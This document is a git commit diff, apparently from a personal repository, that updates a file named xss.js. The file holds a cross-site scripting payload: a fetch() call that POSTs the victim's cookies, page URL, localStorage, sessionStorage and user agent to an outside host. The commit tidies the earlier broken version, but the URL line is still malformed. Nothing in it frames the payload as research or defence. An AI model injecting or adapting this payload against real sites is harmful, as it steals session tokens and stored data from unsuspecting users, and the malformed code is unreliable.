751e2ad67db129c38ac6fa4ffcf36c3f271e9778
abdrezzak12 <108536401+abdrezzak12@users.noreply.github.com>
2025-06-26 12:26:56 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,15 +1,11 @@
 fetch(https://"https://js.rip/1v7sr0xo3h", { 
-
-      method: "POST",
-      mode: "no-cache",
-      body: JSON.stringify({
-            cookie: document.cookie,
-            location: window.location.href,
-            localStorge:
-            JSON.stringify(sessionStrong),
-            JSON.stringify(sessionstrong),
-            userAgent: navigator.userAgent
-
-})
-
+  method: "POST",
+  mode: "no-cors",
+  body: JSON.stringify({
+    cookie: document.cookie,
+    location: window.location.href,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    userAgent: navigator.userAgent
+  })
 });
